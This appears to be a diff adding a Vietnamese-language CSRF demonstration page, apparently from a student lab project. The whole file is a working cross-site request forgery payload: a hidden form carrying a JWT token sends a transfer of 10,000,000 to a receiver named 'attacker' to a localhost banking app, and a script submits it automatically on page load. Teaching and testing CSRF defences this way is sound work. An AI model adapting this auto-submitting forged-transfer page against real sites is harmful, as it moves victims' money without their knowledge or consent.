@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/css/app.min.css" />
+        <title>CSRF Demo - Nhóm CSRF</title>
+    </head>
+    <body>
+        <div
+            class="
+                hidden
+                flex flex-col
+                items-center
+                justify-center
+                text-gray-700
+                border-r-2 border-gray-100
+                w-screen
+                h-screen
+                bg-white
+            "
+        >
+            <form
+                class="flex flex-col bg-white rounded shadow-md p-12 mt-12 border-2 border-gray-100"
+                action="http://localhost:3001/"
+                method="POST"
+            >
+                <input
+                    type="text"
+                    name="token"
+                    value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwiaWF0IjoxNjM1NDA0NzM2LCJleHAiOjE2MzU0MDUzMzZ9.1fy48giqDgHhe8sJbUBrzSezF1josqVOvmZpvp3En8g"
+                    readonly
+                    hidden
+                />
+                <label class="font-semibold text-xs" for="receiver">Người nhận</label>
+                <input
+                    type="text"
+                    name="receiver"
+                    id="receiver"
+                    class="flex items-center h-12 px-4 w-64 bg-gray-200 mt-2 rounded focus:outline-none focus:ring-2"
+                    value="attacker"
+                />
+                <label class="font-semibold text-xs mt-3" for="amount">Số tiền</label>
+                <input
+                    type="number"
+                    name="amount"
+                    id="amount"
+                    class="flex items-center h-12 px-4 w-64 bg-gray-200 mt-2 rounded focus:outline-none focus:ring-2"
+                    value="10000000"
+                />
+                <button
+                    class="
+                        flex
+                        items-center
+                        justify-center
+                        h-12
+                        px-6
+                        w-64
+                        bg-blue-600
+                        mt-8
+                        rounded
+                        font-semibold
+                        text-sm text-blue-100
+                        hover:bg-blue-700
+                    "
+                >
+                    Chuyển tiền
+                </button>
+            </form>
+        </div>
+        <script defer>
+            window.onload = () => {
+                const form = document.querySelector("form");
+                form.submit();
+            };
+        </script>
+    </body>
+</html>
